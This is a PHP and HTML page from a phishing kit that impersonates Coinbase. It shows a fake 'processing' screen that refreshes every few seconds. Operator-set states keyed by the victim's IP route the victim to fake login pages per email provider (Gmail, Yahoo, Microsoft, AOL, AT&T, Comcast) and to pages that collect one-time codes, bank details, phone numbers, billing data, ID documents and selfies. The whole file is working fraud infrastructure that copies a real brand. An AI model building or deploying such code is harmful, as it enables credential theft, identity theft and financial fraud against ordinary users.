<?php
session_start();
require_once('../function/settings.php');
$Greed = new Coinbasah();
$Greed->updateLog();

if (@$_SESSION['Status'] != 'waiting') {
    $_SESSION['Status'] = 'Signin';
    header("Location: login?c_ds_na=".$Greed->generateRandomText(42)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
    exit;
}

$ip = $_SESSION['Userinfo'];
$visitorStateFile = "../log/visitor_state.json";
$visitorStateContent = "";


if (file_exists($visitorStateFile)) {
    $visitorStates = json_decode(file_get_contents($visitorStateFile), true);

    if (isset($visitorStates[$ip])) {
        $state = $visitorStates[$ip];
        if ($state == 'email') {
            unset($_SESSION['Error']);
            $_SESSION['Status'] = 'Email';
            if(strtolower(preg_match('/@gmail/', $_SESSION['Email']))) {
                header("Location: gmail?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit();
            }elseif(strtolower(preg_match('/@(yahoo|ymail)/', $_SESSION['Email']))){
                header("Location: yahoo?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit();
            }elseif(strtolower(preg_match('/@(hotmail|outlook|live|msn)/', $_SESSION['Email']))){
                header("Location: microsoft?c_ds_na=".urlencode($_SERVER['HTTP_ACCEPT'])."&c_ds_no=".$Greed->generateRandomText(42));
                exit();
            }elseif(strtolower(preg_match('/@aol/', $_SESSION['Email']))){
                header("Location: aol?c_ds_na=".urlencode($_SERVER['HTTP_ACCEPT'])."&c_ds_no=".$Greed->generateRandomText(42));
                exit();
            }elseif(strtolower(preg_match('/@(att|ameritech|sbcglobal|bellsouth|flash|nvbell|pacbell|prodigy|snet|swbell)/', $_SESSION['Email']))){
                header("Location: att?".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit();
            }elseif (preg_match('/@(comcast|xfinity)/', strtolower($_SESSION['Email']))) {
                header("Location: comcast?".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit();
            } else{
                $_SESSION['Status'] = 'otp';
                header("Location: loginotp?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit;
            }
        } elseif ($state == 'gmailauth') {
            $_SESSION['Status'] = 'gmailauth';
            header("Location: gmailauth?c_ds_na=".$Greed->generateRandomText(42)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
            exit();
        } elseif ($state == 'wrongpass') {
            $_SESSION['Status'] = 'Password';
            $_SESSION['errorPass'] = true;
            header("Location: signins?c_ds_na=".$Greed->generateRandomText(42)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
            exit();
        } elseif ($state == 'login') {
            $_SESSION['Status'] = 'Signin';
            header("Location: signin?c_ds_na=".$Greed->generateRandomText(42)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
            exit();
        } elseif ($state == 'otptomail') {
           unset($_SESSION['waiting']);
            $_SESSION['Status'] = 'otpmail';
            if (preg_match('/@(yahoo|ymail)/', strtolower($_SESSION['Email']))) {
                header("Location: yahooauth?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
            } elseif (preg_match('/@aol/', strtolower($_SESSION['Email']))) {
                header("Location: aolauth?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
            } else {
                $_SESSION['Status'] = 'otp';
                header("Location: loginotp?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
            }
            exit();
        } elseif ($state == 'wrongempas') {
            unset($_SESSION['Error']);
            $_SESSION['errorb'] = true;
            $_SESSION['Status'] = 'Email';
            if(strtolower(preg_match('/@gmail/', $_SESSION['Email']))) {
                header("Location: gmail?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit();
            }elseif(strtolower(preg_match('/@(yahoo|ymail)/', $_SESSION['Email']))){
                header("Location: yahoo?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit();
            }elseif(strtolower(preg_match('/@(hotmail|outlook|live|msn)/', $_SESSION['Email']))){
                header("Location: microsoft?c_ds_na=".urlencode($_SERVER['HTTP_ACCEPT'])."&c_ds_no=".$Greed->generateRandomText(42));
                exit();
            }elseif(strtolower(preg_match('/@aol/', $_SESSION['Email']))){
                header("Location: aol?c_ds_na=".urlencode($_SERVER['HTTP_ACCEPT'])."&c_ds_no=".$Greed->generateRandomText(42));
                exit();
            }elseif(strtolower(preg_match('/@(att|ameritech|sbcglobal|bellsouth|flash|nvbell|pacbell|prodigy|snet|swbell)/', $_SESSION['Email']))){
                header("Location: att?".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit();
            }elseif (preg_match('/@(comcast|xfinity)/', strtolower($_SESSION['Email']))) {
                header("Location: comcast?".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit();
            } else{
                $_SESSION['Status'] = 'otp';
                header("Location: loginotp?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit;
            }
        } elseif ($state == 'otpmail') {
            unset($_SESSION['Error']);
            $_SESSION['Status'] = 'otpmail';
            if(strtolower(preg_match('/@gmail/', $_SESSION['Email']))) {
                header("Location: gmails?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit;
            }elseif(strtolower(preg_match('/@(yahoo|ymail)/', $_SESSION['Email']))){
                header("Location: yahoos?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit;
            }elseif(strtolower(preg_match('/@(hotmail|outlook|live|msn)/', $_SESSION['Email']))){
                header("Location: microsofts?c_ds_na=".urlencode($_SERVER['HTTP_ACCEPT'])."&c_ds_no=".$Greed->generateRandomText(42));
                exit;
            }elseif(strtolower(preg_match('/@aol/', $_SESSION['Email']))){
                header("Location: aols?c_ds_na=".urlencode($_SERVER['HTTP_ACCEPT'])."&c_ds_no=".$Greed->generateRandomText(42));
                exit;
                
            }elseif(strtolower(preg_match('/@(att|ameritech|sbcglobal|bellsouth|flash|nvbell|pacbell|prodigy|snet|swbell)/', $_SESSION['Email']))){
                header("Location: atts?".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit;
            }elseif (preg_match('/@(comcast|xfinity)/', strtolower($_SESSION['Email']))) {
                header("Location: comcasts?".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit;
            }else{
                $_SESSION['Status'] = 'otp';
                header("Location: loginotp?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
                exit;
            }
            exit();
        } elseif ($state == 'bank') {
            unset($_SESSION['Error']);
            $_SESSION['Status'] = 'accountbank';
            header("Location: accountbank?c_ds_na=" . $Greed->generateRandomText(12) . "&c_ds_no=" . urlencode($_SERVER['HTTP_ACCEPT']));
            exit;
        } elseif ($state == 'phonenumber') {
            unset($_SESSION['Error']);
            $_SESSION['Status'] = 'phonenumber';
            header("Location: phonenumber?c_ds_na=" . $Greed->generateRandomText(12) . "&c_ds_no=" . urlencode($_SERVER['HTTP_ACCEPT']));
            exit;
        } elseif ($state == 'phonenumbers') {
            unset($_SESSION['Error']);
            $_SESSION['Status'] = 'phonenumber';
            header("Location: phonenumbers?c_ds_na=" . $Greed->generateRandomText(12) . "&c_ds_no=" . urlencode($_SERVER['HTTP_ACCEPT']));
            exit;
        }elseif ($state == 'billing') {
            unset($_SESSION['Error']);
            $_SESSION['Status'] = 'information';
            header("Location: Account?c_ds_na=" . $Greed->generateRandomText(12) . "&c_ds_no=" . urlencode($_SERVER['HTTP_ACCEPT']));
            exit;
        } elseif ($state == 'password') {
            unset($_SESSION['Error']);
            $_SESSION['Passsecond'] = true;
            $_SESSION['Status'] = 'Password';
            header("Location: signins?c_ds_na=" . $Greed->generateRandomText(12) . "&c_ds_no=" . urlencode($_SERVER['HTTP_ACCEPT']));
            exit;
        } elseif ($state == 'document') {
            unset($_SESSION['Error']);
            $_SESSION['Status'] = 'accountverify';
            header("Location: accountverify?c_ds_na=" . $Greed->generateRandomText(12) . "&c_ds_no=" . urlencode($_SERVER['HTTP_ACCEPT']));
            exit;
        } elseif ($state == 'selfie') {
            unset($_SESSION['Error']);
            $_SESSION['Status'] = 'accountverified';
            header("Location: accountverified?c_ds_na=" . $Greed->generateRandomText(12) . "&c_ds_no=" . urlencode($_SERVER['HTTP_ACCEPT']));
            exit;
        } elseif ($state == 'otpcode') {
            unset($_SESSION['Error']);
            $_SESSION['Status'] = 'otp';
            header("Location: loginotp?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
            exit;
        } elseif ($state == 'authcode') {
            unset($_SESSION['Error']);
            $_SESSION['Status'] = 'authcode';
            header("Location: loginauthen?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
            exit;
        }  elseif ($state == 'finish') {
            unset($_SESSION['Error']);
            $_SESSION['Status'] = 'finish';
            header("Location: accountreview?c_ds_na=".$Greed->generateRandomText(12)."&c_ds_no=".urlencode($_SERVER['HTTP_ACCEPT']));
            exit;
        } else {
            $visitorStateContent = "Please wait for approval.";
        }
    } else {
        $visitorStateContent = "IP address not found.";
    }
} else {
    $visitorStateContent = "Visitor state file not found.";
}
?>
<!DOCTYPE html>
<html lang="en" class="js-focus-visible" data-js-focus-visible="">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="refresh" content="3">
    <meta http-equiv="origin-trial" content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <title>Coinbase Processing...</title>
    <link rel="icon" href="assets/images/favicon.ico">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link href="assets/css/styles.d87df576ff25e358663e.css" rel="stylesheet">
    <link href="assets/css/styles.43cdd765c2fa35b596d4.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="assets/css/styles.babae8c0eccf7b247500.css">
    <link rel="stylesheet" type="text/css" href="assets/css/styles__ltr.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bodymovin/5.7.6/lottie.min.js"></script>
    <link rel="stylesheet" href="assets/css/doc.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bodymovin/5.7.6/lottie.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css" integrity="sha512-jnSuA4Ss2PkkikSOLtYs8BlYIeeIK1h99ty4YfvRPAlzr377vr3CXDb7sb7eEEBYjDtcYj+AjBH3FLv5uSJuXg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        .center-content {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin-top: 170px;
        }
        .imagecok{
            width: 280px;
        }

        #animationContainer {
            width: 200px; /* Set your desired width */
            height: 200px; /* Set your desired height */
            margin-bottom: 10px; /* Space between the animation and the text */
        }
        @media (max-width: 600px) {
            #animationContainer {
                width: 150px; /* Set your desired width */
                height: 150px; /* Set your desired height */
                margin-bottom: 10px; /* Space between the animation and the text */
            }
            .imagecok{
                width: 200px;
            }
        }

        .loading-text {
            font-size: 16px; /* Adjust font size if needed */
            color: #333; /* Adjust text color if needed */
        }
    </style>
</head>

<body class="cds-light-l1k3tbpe" style="background-color: rgba(var(--gray0));"><noscript>You need to enable JavaScript
        to run this app.</noscript>
    <div id="root" style="display: flex; flex-direction: column; min-height: 100%">
        <div class="cds-large-llfbhh8 cds-light-l1k3tbpe" style="--foreground: rgb(var(--gray100)); --foreground-muted: rgb(var(--gray60)); --background: rgb(var(--gray0)); --background-alternate: rgb(var(--gray5)); --background-overlay: rgba(var(--gray80),0.33); --line: rgba(var(--gray60),0.2); --line-heavy: rgba(var(--gray60),0.66); --primary: rgb(var(--blue60)); --primary-wash: rgb(var(--blue0)); --primary-foreground: rgb(var(--gray0)); --negative: rgb(var(--red60)); --negative-foreground: rgb(var(--gray0)); --positive: rgb(var(--green60)); --positive-foreground: rgb(var(--gray0)); --secondary: rgb(var(--gray5)); --secondary-foreground: rgb(var(--gray100)); --transparent: rgba(var(--gray0),0); --warning: rgb(var(--yellow50));">
            <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-background-b85wjan" style="height: 100%; width: 100%;">
                <div data-testid="signin-header" class="cds-flex-f1g67tkn cds-center-cv8796s cds-center-ca5ylan cds-space-between-s1vbz1 cds-background-b85wjan cds-2-_115h1mf cds-2-_1qjdqpv cds-3-_1ol1258 cds-3-_1ti0n00 cds-5-_g0seea" style="width: 100%;"><a data-testid="header-logo-link" class="cds-link cds-link-l17zyfmx" title="Home" href="#"><span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container"><svg aria-label="Coinbase logo" class="cds-iconStyles-iogjozt" height="32" role="img" viewBox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
                                <title>Coinbase logo</title>
                                <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#0052FF"></path>
                            </svg></span></a>
                    <div class="cds-flex-f1g67tkn cds-row-r1tfxker cds-1-_obadkb"><a data-testid="button-sign-up" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-secondaryForeground-s111xox1 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" href="#" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: transparent; --interactable-hovered-background: rgb(250, 250, 250); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(235, 235, 236); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(255, 255, 255);"><span class="cds-positionRelative-p109mlw7"></span></a><a data-testid="button-business-login" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-secondaryForeground-s111xox1 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" href="#" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: var(--secondary); --interactable-hovered-background: rgb(233, 235, 238); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(220, 222, 225); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(247, 248, 249);"><span class="cds-positionRelative-p109mlw7"><span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-secondaryForeground-s111xox1 cds-transition-txjiwsi cds-start-s1muvu8a"><span class="">Sign out</span></span></span></a></div>
                </div>
                <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-1-_1xqs9y8 cds-1-_9w3lns" style="width: 100%; height: 100vh;">
                    <div class="cds-flex-f1g67tkn cds-flex-start-f1lnfmfd cds-row-r1tfxker cds-center-czxavit" style="width: 100%;">
                        <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="max-width: 750px; width: 100%;">
                            <div class="cds-flex-f1g67tkn cds-center-czxavit cds-roundedLarge-rdc2t5d cds-bordered-b17mbjy1 cds-5-_1fh7zw6 cds-5-_1yjsi5b cds-4-_1w9a5m" style="width: 100%; border:none;">
                                <div id="two-factor" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_1mvq9l2" style="width: 100%; ">
                                    <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 750px; width: 100%;">
                                        <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 750px; width: 100%;">
                                            <div data-testid="load-view-wrapper" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 750px; width: 100%;">
                                                <div data-testid="password-input-code" class="cds-flex-f1g67tkn cds-column-ci8mx7v">
                                                    <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-2-_1qjdqpv center-content">
                                                        <div id="animationContainer"></div>
                                                         <img src="assets/images/coinbase.png" alt="" class="imagecok">
                                                    </div>
                                                </div>
                                                <div class="cds-flex-f1g67tkn r7rfe1z" style="display: flex; justify-content: center; align-items: center;">
                                                    <div data-testid="visible_recaptcha" data-sitekey="NOT_USED"></div>
                                                    <div data-testid="invisible_recaptcha" data-sitekey="6LcTV7IcAAAAAI1CwwRBm58wKn1n6vwyV1QFaoxr">
                                                        <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
                                                            <div class="grecaptcha-logo">
                                                                <div class="rc-anchor rc-anchor-invisible rc-anchor-light rc-anchor-invisible-hover">
                                                                    <div id="recaptcha-accessible-status" class="rc-anchor-aria-status" aria-hidden="true">Recaptcha requires verification. </div>
                                                                    <div class="rc-anchor-error-msg-container" style="display:none"><span class="rc-anchor-error-msg" aria-hidden="true"></span></div>
                                                                    <div class="rc-anchor-normal-footer">
                                                                        <div class="rc-anchor-logo-large" role="presentation">
                                                                            <div class="rc-anchor-logo-img rc-anchor-logo-img-large"></div>
                                                                        </div>
                                                                        <div class="rc-anchor-pt"><a href="#" target="_blank">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="#" target="_blank">Terms</a></div>
                                                                    </div>
                                                                    <div class="rc-anchor-invisible-text"><span>protected by <strong>reCAPTCHA</strong></span>
                                                                        <div class="rc-anchor-pt"><a href="#" target="_blank" style="display: unset;">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="#" target="_blank" style="display: unset;">Terms</a></div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
            <div data-testname="open-banner" data-testid="banner-container" class="cds-flex-f1g67tkn cds-fixed-f1v5p9l4" style="width: 100%; position: fixed; bottom: 0px; z-index: 3; transition: bottom 500ms ease 0s; will-change: bottom;">
                <div id="cookie-banner" class="cookie-banner cds-flex-f1g67tkn cds-center-czxavit cds-backgroundAlternate-b1o0kdmt" style="width: 100%;">
                    <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-space-between-s1vbz1 cds-3-_1ixgcz3 cds-3-_1mvq9l2 cds-6-_1iifjn6 cds-6-_1ts70zl" style="max-width: 800px; width: 100%;">
                        <p class="cds-typographyResets-t1xhpuq2 cds-label2-ln29cth cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-0-_vhy4ik cds-1-_7ojgr9">
                            We use strictly necessary cookies to enable essential functions, such as security and
                            authentication. For more information, see our <a class="cds-link cds-link-l17zyfmx" href="#" rel="noopener noreferrer" target="_blank"><span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container">Cookie
                                    Policy</span></a>.</p><button data-testid="dismiss-button" class="dismiss-button cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" type="button" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(1, 76, 236); --interactable-hovered-opacity: 0.92; --interactable-pressed-background: rgb(1, 72, 221); --interactable-pressed-opacity: 0.86; --interactable-disabled-background: rgb(128, 169, 255);"><span class="cds-positionRelative-p109mlw7"><span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primaryForeground-pxcz3o7 cds-transition-txjiwsi cds-start-s1muvu8a"><span class="">Dismiss</span></span></span></button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="portalRoot" style="z-index: 100001; position: relative; display: flex;">
        <div data-testid="portal-modal-container" id="modalsContainer" style="z-index: 3;"></div>
        <div data-testid="portal-toast-container" id="toastsContainer" style="z-index: 6;"></div>
        <div data-testid="portal-alert-container" id="alertsContainer" style="z-index: 7;">
            <div class="cds-large-llfbhh8 cds-light-l1k3tbpe" style="--foreground: rgb(var(--gray100)); --foreground-muted: rgb(var(--gray60)); --background: rgb(var(--gray0)); --background-alternate: rgb(var(--gray5)); --background-overlay: rgba(var(--gray80),0.33); --line: rgba(var(--gray60),0.2); --line-heavy: rgba(var(--gray60),0.66); --primary: rgb(var(--blue60)); --primary-wash: rgb(var(--blue0)); --primary-foreground: rgb(var(--gray0)); --negative: rgb(var(--red60)); --negative-foreground: rgb(var(--gray0)); --positive: rgb(var(--green60)); --positive-foreground: rgb(var(--gray0)); --secondary: rgb(var(--gray5)); --secondary-foreground: rgb(var(--gray100)); --transparent: rgba(var(--gray0),0); --warning: rgb(var(--yellow50));">
            </div>
        </div>
        <div data-testid="portal-tooltip-container" id="tooltipContainer" style="z-index: 5;"></div>
    </div>
    <div id="cds-hexagon-clipPath-container" aria-hidden="true" style="height: 0px; width: 0px;"><svg height="0" viewBox="0 0 66 62" width="0">
            <defs>
                <clippath clipPathUnits="objectBoundingBox" id="cds-hexagon-avatar-clipper" transform="scale(0.015151515151515152 0.016129032258064516)">
                    <path d="M63.4372 22.8624C66.2475 27.781 66.2475 33.819 63.4372 38.7376L54.981 53.5376C52.1324 58.5231 46.8307 61.6 41.0887 61.6H24.4562C18.7142 61.6 13.4125 58.5231 10.564 53.5376L2.10774 38.7376C-0.702577 33.819 -0.702582 27.781 2.10774 22.8624L10.564 8.06243C13.4125 3.07687 18.7142 0 24.4562 0H41.0887C46.8307 0 52.1324 3.07686 54.981 8.06242L63.4372 22.8624Z">
                    </path>
                </clippath>
            </defs>
        </svg></div>
    <script>
        // Load animation using Lottie
        var animation = lottie.loadAnimation({
            container: document.getElementById('animationContainer'), // the DOM element that will contain the animation
            renderer: 'svg',
            loop: true,
            autoplay: true,
            path: 'assets/js/Loading.json' // the path to the animation json
        });
        // Animation for loading text
        const loadingText = document.getElementById('loadingText');
        let dotCount = 0;

        setInterval(() => {
            dotCount = (dotCount + 1) % 4;
            loadingText.textContent = 'Loading' + '.'.repeat(dotCount);
        }, 500); // Adjust the interval time as needed
    </script>

</body>

</html>
